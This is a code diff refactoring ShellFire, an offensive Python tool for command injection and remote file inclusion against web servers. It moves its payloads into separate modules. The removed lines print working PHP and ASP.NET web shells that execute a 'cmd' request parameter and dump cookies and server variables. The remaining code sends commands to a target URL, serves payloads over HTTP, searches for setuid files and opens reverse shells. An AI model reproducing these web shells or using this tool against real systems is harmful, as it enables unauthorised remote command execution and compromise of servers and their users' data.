@@ -4,10 +4,8 @@
 # Aug 2016
 
 import argparse
-import base64
 import json
 import os
-import re
 import readline
 import requests
 import select
@@ -16,6 +14,9 @@ import sys
 import threading
 import time
 
+from config import Configs
+from commands import command_list
+from payloads import get_aspnet_payload, get_php_payload
 from plugin_collection import PluginCollection
 #from pydantic import BaseModel
 
@@ -28,43 +29,6 @@ if (sys.version_info < (3, 0)):
 
 ############################################################
 ## Configs
-
-class Configs():
-  def __init__(self):
-    self.version = "0.7.b"
-    self.url = "http://www.example.com?"
-    self.history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
-    self.post_data = {}
-    self.cookies = {}
-    self.headers = {
-      'User-Agent': '',
-      'Referer': ''
-    }
-    
-    """The default header set for outgoing requests.
-    """
-    self.default_headers = {
-      'User-Agent': ''
-    }
-    
-    self.method = "get"
-    
-    self.auth = None
-    self.auth_user = None
-    self.auth_pass = None
-    self.payload = ""
-    self.payload_type = "PHP"
-    self.encode_chain = []
-    self.encode = None
-    self.marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
-    self.http_port = 8888
-  
-  def dump(self):
-    return json.dumps(self.__dict__)
-
-  def load(self, json_cfg):
-    self.__dict__.update(json_cfg)
-    return
 
 cfg = Configs()
 
@@ -80,37 +44,11 @@ userinput = None
 ## Payloads
 
 def payload_aspnet():
-  cfg.payload = f"""\
-{cfg.marker}<%
-Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
-Dim command = Request.QueryString("cmd")
-
-Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")
-
-Dim objExec = objShell.Exec(comspec & " /c " & command)
-Dim output = objExec.StdOut.ReadAll()
-%><%= output %>{cfg.marker}
-"""
+  cfg.payload = get_aspnet_payload(cfg.marker)
   cfg.payload_type = "ASP.NET"
 
 def payload_php():
-  cfg.payload = f"""\
-{cfg.marker}<?php
-if ($_GET['cmd'] == '_show_phpinfo') {{
-  phpinfo();
-}} else if ($_GET['cmd'] == '_show_cookie') {{
-  var_dump($_COOKIE);
-}} else if ($_GET['cmd'] == '_show_get') {{
-  var_dump($_GET);
-}} else if ($_GET['cmd'] == '_show_post') {{
-  var_dump($_POST);
-}} else if ($_GET['cmd'] == '_show_server') {{
-  var_dump($_SERVER);
-}} else {{
-  system($_GET['cmd']) || print `{{$_GET['cmd']}}`;
-}}
-?>{cfg.marker}
-"""
+  cfg.payload = get_php_payload(cfg.marker)
   cfg.payload_type = "PHP"
 
 ############################################################
@@ -128,75 +66,16 @@ args = parser.parse_args()
 def show_help(cmd=None):
   if cmd and cmd[0:1] == '.':
     cmd = cmd[1:]
-  if cmd == "auth":
-    sys.stdout.write(".auth - show current HTTP Auth credentials\n")
-    sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
-  elif cmd == "config":
-    sys.stdout.write(".config save [name] - save a named config\n")
-    sys.stdout.write(".config load [name] - load a named config\n")
-  elif cmd == "cookies":
-    sys.stdout.write(".cookies - show current cookies to be sent with each request\n")
-    sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
-  elif cmd == "encode":
-    sys.stdout.write(".encode - show current encoding used before sending commands\n")
-    sys.stdout.write(".encode base64 - encode commands with base64 before sending\n")
-    sys.stdout.write(".encode none - do not encode commands before sending\n")
-  elif cmd == "find":
-    sys.stdout.write(".find setuid - search for setuid files\n")
-    sys.stdout.write(".find setgid - search for setgid files\n")
-  elif cmd == "history":
-    sys.stdout.write(".history clear - erase history\n")
-    sys.stdout.write(".history nosave - do not write history file\n")
-    sys.stdout.write(".history save - write history file on exit\n")
-  elif cmd == "http":
-    sys.stdout.write(".http - show status of HTTP server\n")
-    sys.stdout.write(".http payload [type] - set the payload to be used for RFI\n")
-    sys.stdout.write("                       supported payload types:\n")
-    sys.stdout.write("                       aspnet\n")
-    sys.stdout.write("                       php\n")
-    sys.stdout.write(".http start [port] - start HTTP server\n")
-    sys.stdout.write(".http stop - stop HTTP server\n")
-  elif cmd == "marker":
-    sys.stdout.write(".marker <string> - set the payload output marker to string.\n")
-  elif cmd == "method":
-    sys.stdout.write(".method - show current HTTP method\n")
-    sys.stdout.write(".method get - set HTTP method to GET\n")
-    sys.stdout.write(".method post - set HTTP method to POST\n")
-  elif cmd == "post":
-    sys.stdout.write(".post <json> - a json string representing post data you wish to send\n")
-  elif cmd == "referer":
-    sys.stdout.write(".referer - show the HTTP referer string\n")
-    sys.stdout.write(".referer <string> - set the value for HTTP referer\n")
-  elif cmd == "shell":
-    sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
-  elif cmd == "url":
-    sys.stdout.write(".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n")
-    sys.stdout.write("                if {} is not set, 'cmd' param will automatically be appended.\n")
-  elif cmd == "useragent":
-    sys.stdout.write(".useragent - show the User-Agent string\n")
-    sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
+  if cmd in command_list:
+    if len(command_list[cmd]["help_text"]):
+      sys.stdout.write("".join(command_list[cmd]["help_text"]))
+    else:
+      sys.stdout.write("command doesn't have help text\n")
   else:
-    sys.stdout.write("""\
-Available commands:
-  .auth
-  .cookies
-  .encode
-  .exit
-  .find
-  .help
-  .history
-  .http
-  .marker
-  .method
-  .phpinfo
-  .post
-  .referer
-  .headers
-  .shell
-  .url
-  .useragent
-  .quit
-""")
+    sys.stdout.write("Available commands:")
+    for cmd_key in command_list:
+      sys.stdout.write("%s\n" % command_list[cmd_key]["prefix"])
+
 
 def http_server(port):
   ## super simple http. we can probably make this more robust.
@@ -546,152 +425,141 @@ def cmd_useragent(cmd):
 ############################################################
 ## Main App
 
-## if we are generating a payload to stdout, do it now, then bail
-if args.payload:
-  args.payload = args.payload.lower()
-  if args.payload == "php":
-    sys.stderr.write("[*] Generating PHP payload...\n")
-    payload_php()
-  elif args.payload == "aspnet":
-    sys.stderr.write("[*] Generating ASP.NET payload...\n")
-    payload_aspnet()
-  else:
-    sys.stderr.write("[*] Invalid payload!\n")
-  sys.stdout.write(cfg.payload)
-  sys.exit(1)
+def main():
+  global http_running
 
-## show our banner
-sys.stdout.write(""" (                                            
- )\ )    )       (   (   (                    
-(()/( ( /(    (  )\  )\  )\ )  (   (      (   
- /(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
-(_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
-/ __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
-\__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
-|___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
-""")
-sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
-sys.stdout.write("[*] Type '.help' to see available commands\n")
-if args.debug == True:
-  sys.stdout.write("[*] Debug mode enabled.\n")
-
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
-## if we specified to load a named config, do it now
-if args.config:
-  cmd_config([".config", "load", args.config])
-
-## setup history
-if os.path.isfile(cfg.history_file):
-  try:
-    readline.read_history_file(cfg.history_file)
-  except:
-    pass
-
-## set initial payload for PHP
-payload_php()
-
-## main loop
-while True:
-  while revshell_running:
-    time.sleep(0.1)
-  ## reset command execution state each loop
-  exec_cmd = False
-  ## draw our prompt
-  userinput = input('>> ')
-  if not userinput:
-    continue
-  ## parse our input
-  cmd = userinput.split()
-  if cmd[0] == ".exit" or cmd[0] == ".quit":
-    http_running = False
-    if os.path.isfile(cfg.history_file):
-        readline.write_history_file(cfg.history_file)
-    sys.exit(0)
-  elif cmd[0] == ".auth":
-    cmd_auth(cmd)
-  elif cmd[0] == ".config":
-    cmd_config(cmd)
-  elif cmd[0] == ".cookies":
-    cmd_cookies(cmd)
-  elif cmd[0] == ".encode":
-    exec_cmd = cmd_encode(cmd)
-  elif cmd[0] == ".find":
-    exec_cmd = cmd_find(cmd)
-  elif cmd[0] == ".help":
-    cmd_help(cmd)
-  elif cmd[0] == ".history":
-    cmd_history(cmd)
-  elif cmd[0] == ".http":
-    cmd_http(cmd)
-  elif cmd[0] == ".marker":
-    cmd_marker(cmd)
-  elif cmd[0] == ".method":
-    cmd_method(cmd)
-  elif cmd[0] == ".phpinfo":
-    exec_cmd = cmd_phpinfo(cmd)
-  elif cmd[0] == ".post":
-    cmd_post(cmd)
-  elif cmd[0] == ".referer":
-    cmd_referer(cmd)
-  elif cmd[0] == ".headers":
-    cmd_headers(cmd)
-  elif cmd[0] == ".shell":
-    exec_cmd = cmd_shell(cmd)
-  elif cmd[0] == ".url":
-    cmd_url(cmd)
-  elif cmd[0] == ".useragent":
-    cmd_useragent(cmd)
-  else:
-    exec_cmd = True
-
-  ## execute our command to the remote target
-  if exec_cmd:
-    cmd = userinput
-
-    ## let's run our input through our encoding plugins
-    if len(cfg.encode_chain):
-      try:
-        for enc in cfg.encode_chain:
-          cmd = plugins.plugins[enc].run(cmd)
-      except:
-        pass
-
-    ## validate the URL format
-    if '{}' in cfg.url:
-      query = cfg.url.replace('{}', cmd.strip())
+  ## if we are generating a payload to stdout, do it now, then bail
+  if args.payload:
+    args.payload = args.payload.lower()
+    if args.payload == "php":
+      sys.stderr.write("[*] Generating PHP payload...\n")
+      payload_php()
+    elif args.payload == "aspnet":
+      sys.stderr.write("[*] Generating ASP.NET payload...\n")
+      payload_aspnet()
     else:
-      if '?' in cfg.url:
-        if 'cmd=' not in cfg.url:
-          query = cfg.url + '&cmd=' + cmd
-        else:
-          query = cfg.url.replace('cmd=', 'cmd=' + cmd)
-      else:
-        query = cfg.url + cmd.strip()
-    ## log debug info
-    if args.debug:
-      sys.stdout.write("[D] " + query + "\n")
-    try:
-      if cfg.method == "post":
-        r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
-      else:
-        r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
-      ## sanitize the output. we only want to see our commands if possible
-      output = r.text.split(cfg.marker)
-      if len(output) > 1:
-        output = output[1]
-      else:
-        output = output[0]
-      ## display our results
-      sys.stdout.write(output + "\n")
-      if userinput == '_show_phpinfo':
-        file = 'phpinfo.html'
-        fp = open(file, 'w')
-        fp.write(output)
-        fp.close()
-        sys.stdout.write("[*] Output saved to " + file + "\n")
-    except Exception as e:
-      sys.stderr.write("[!] Unable to make request to target\n")
-      sys.stderr.write("[!] %s\n" % e)
-      sys.stdout.flush()
+      sys.stderr.write("[*] Invalid payload!\n")
+    sys.stdout.write(cfg.payload)
+    sys.exit(1)
 
+  ## show our banner
+  sys.stdout.write(""" (                                            
+  )\ )    )       (   (   (                    
+  (()/( ( /(    (  )\  )\  )\ )  (   (      (   
+  /(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
+  (_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
+  / __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
+  \__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
+  |___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
+  """)
+  sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
+  sys.stdout.write("[*] Type '.help' to see available commands\n")
+  if args.debug == True:
+    sys.stdout.write("[*] Debug mode enabled.\n")
+
+  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+  ## if we specified to load a named config, do it now
+  if args.config:
+    cmd_config([".config", "load", args.config])
+
+  ## setup history
+  if os.path.isfile(cfg.history_file):
+    try:
+      readline.read_history_file(cfg.history_file)
+    except:
+      pass
+
+  ## set initial payload for PHP
+  payload_php()
+
+  ## main loop
+  while True:
+    while revshell_running:
+      time.sleep(0.1)
+    ## reset command execution state each loop
+    exec_cmd = False
+    ## draw our prompt
+    userinput = input('>> ')
+    if not userinput:
+      continue
+    ## parse our input
+    cmd = userinput.split()
+    match cmd[0]:
+      case ".exit" | ".quit":
+        http_running = False
+        if os.path.isfile(cfg.history_file):
+            readline.write_history_file(cfg.history_file)
+        sys.exit(0)
+      case ".auth": cmd_auth(cmd)
+      case ".config": cmd_config(cmd)
+      case ".cookies": cmd_cookies(cmd)
+      case ".encode": exec_cmd = cmd_encode(cmd)
+      case ".find": exec_cmd = cmd_find(cmd)
+      case ".help": cmd_help(cmd)
+      case ".history": cmd_history(cmd)
+      case ".http": cmd_http(cmd)
+      case ".marker": cmd_marker(cmd)
+      case ".method": cmd_method(cmd)
+      case ".phpinfo": exec_cmd = cmd_phpinfo(cmd)
+      case ".post": cmd_post(cmd)
+      case ".referer": cmd_referer(cmd)
+      case ".headers": cmd_headers(cmd)
+      case ".shell": exec_cmd = cmd_shell(cmd)
+      case ".url": cmd_url(cmd)
+      case ".useragent": cmd_useragent(cmd)
+      case other: exec_cmd = True
+
+    ## execute our command to the remote target
+    if exec_cmd:
+      cmd = userinput
+
+      ## let's run our input through our encoding plugins
+      if len(cfg.encode_chain):
+        try:
+          for enc in cfg.encode_chain:
+            cmd = plugins.plugins[enc].run(cmd)
+        except:
+          pass
+
+      ## validate the URL format
+      if '{}' in cfg.url:
+        query = cfg.url.replace('{}', cmd.strip())
+      else:
+        if '?' in cfg.url:
+          if 'cmd=' not in cfg.url:
+            query = cfg.url + '&cmd=' + cmd
+          else:
+            query = cfg.url.replace('cmd=', 'cmd=' + cmd)
+        else:
+          query = cfg.url + cmd.strip()
+      ## log debug info
+      if args.debug:
+        sys.stdout.write("[D] " + query + "\n")
+      try:
+        if cfg.method == "post":
+          r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+        else:
+          r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
+        ## sanitize the output. we only want to see our commands if possible
+        output = r.text.split(cfg.marker)
+        if len(output) > 1:
+          output = output[1]
+        else:
+          output = output[0]
+        ## display our results
+        sys.stdout.write(output + "\n")
+        if userinput == '_show_phpinfo':
+          file = 'phpinfo.html'
+          fp = open(file, 'w')
+          fp.write(output)
+          fp.close()
+          sys.stdout.write("[*] Output saved to " + file + "\n")
+      except Exception as e:
+        sys.stderr.write("[!] Unable to make request to target\n")
+        sys.stderr.write("[!] %s\n" % e)
+        sys.stdout.flush()
+
+# Main entrypoint - let's not pollute the global scope ehre.
+if __name__ == "__main__":
+  main()
